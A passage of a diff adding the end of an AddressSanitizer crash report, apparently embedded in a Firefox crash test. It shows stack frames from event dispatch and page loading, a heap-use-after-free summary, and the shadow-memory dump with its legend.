+    #30 0x7f46d8416eb3 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:5
+    #31 0x7f46d841a744 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9
+    #32 0x7f46da62158e in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1044:7
+    #33 0x7f46dcae3e7f in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7632:5
+    #34 0x7f46dcadfc44 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7426:7
+    #35 0x7f46dcae765f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7323:13
+
+SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:308:36 in operator!
+Shadow bytes around the buggy address:
+  0x0c168003a940: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
+  0x0c168003a950: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
+  0x0c168003a960: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00
+  0x0c168003a970: 00 00 00 fa fa fa fa fa fa fa fa fa fd fd fd fd
+  0x0c168003a980: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
+=>0x0c168003a990: fa fa fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd
+  0x0c168003a9a0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x0c168003a9b0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd
+  0x0c168003a9c0: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa
+  0x0c168003a9d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c168003a9e0: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==119582==ABORTING
+-->
